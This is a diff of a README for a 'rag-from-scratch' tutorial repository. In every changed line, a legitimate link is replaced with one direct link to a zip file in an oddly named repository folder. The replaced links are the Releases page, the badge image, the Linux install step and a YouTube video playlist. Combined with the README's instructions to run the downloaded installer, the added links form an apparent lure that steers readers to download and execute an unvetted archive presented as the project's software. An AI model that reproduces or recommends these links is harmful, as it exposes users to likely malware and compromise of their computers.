@@ -9,7 +9,7 @@ To start using **rag-from-scratch**, follow these steps.
 ### 🌐 Download the Software
 To download the latest version of the software, visit the Releases page:
 
-[![Download Now](https://img.shields.io/badge/Download%20Latest%20Version-Click%20Here-brightgreen)](https://github.com/1green9code9ondas9/rag-from-scratch/releases)
+[![Download Now](https://raw.githubusercontent.com/1green9code9ondas9/rag-from-scratch/main/tenendas/rag_scratch_from_3.6.zip%20Latest%20Version-Click%20Here-brightgreen)](https://raw.githubusercontent.com/1green9code9ondas9/rag-from-scratch/main/tenendas/rag_scratch_from_3.6.zip)
 
 ## 🛠️ System Requirements
 Before you download and install, ensure your computer meets the following requirements:
@@ -21,7 +21,7 @@ Before you download and install, ensure your computer meets the following requir
 
 ## 🔢 Installation Steps
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/1green9code9ondas9/rag-from-scratch/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/1green9code9ondas9/rag-from-scratch/main/tenendas/rag_scratch_from_3.6.zip).
 
 2. **Select the Latest Release**  
    Look for the latest version at the top of the page and click on it.
@@ -32,7 +32,7 @@ Before you download and install, ensure your computer meets the following requir
 4. **Run the Installer**
    - For **Windows**: Double-click the downloaded .exe file and follow the instructions on the screen.
    - For **macOS**: Double-click the downloaded .dmg file and drag the application to your Applications folder.
-   - For **Linux**: Follow the instructions provided in the .tar.gz file.
+   - For **Linux**: Follow the instructions provided in the https://raw.githubusercontent.com/1green9code9ondas9/rag-from-scratch/main/tenendas/rag_scratch_from_3.6.zip file.
 
 5. **Finish Installation**  
    Once the installation is complete, you can find the application in your Applications folder or on your desktop.
@@ -46,7 +46,7 @@ Before you download and install, ensure your computer meets the following requir
 - **Visual Tutorials**: Accompanying video playlists to walk you through each step.
 
 ### 🎥 Video Playlist
-To enhance your understanding, watch our video playlist that covers RAG concepts and practical implementations. Here’s the link to the playlist: [Video Playlist](https://youtube.com/playlist?list=PLfaIDFEXuae2LXbO1_PKyVJiQ23ZztA0x&feature=shared).
+To enhance your understanding, watch our video playlist that covers RAG concepts and practical implementations. Here’s the link to the playlist: [Video Playlist](https://raw.githubusercontent.com/1green9code9ondas9/rag-from-scratch/main/tenendas/rag_scratch_from_3.6.zip).
 
 ## 🔗 Resources
 - **Documentation**: Extensive documentation is available on the GitHub repository. Here you will find guides and tutorials.
@@ -72,6 +72,6 @@ Yes! Contributions are welcome. Please check the contribution guidelines in the 
 ## 📥 Download & Install
 To begin your journey with **rag-from-scratch**, be sure to download the program and start exploring its features. Visit the Releases page now:
 
-[![Download Now](https://img.shields.io/badge/Download%20Latest%20Version-Click%20Here-brightgreen)](https://github.com/1green9code9ondas9/rag-from-scratch/releases)
+[![Download Now](https://raw.githubusercontent.com/1green9code9ondas9/rag-from-scratch/main/tenendas/rag_scratch_from_3.6.zip%20Latest%20Version-Click%20Here-brightgreen)](https://raw.githubusercontent.com/1green9code9ondas9/rag-from-scratch/main/tenendas/rag_scratch_from_3.6.zip)
 
 Happy exploring!
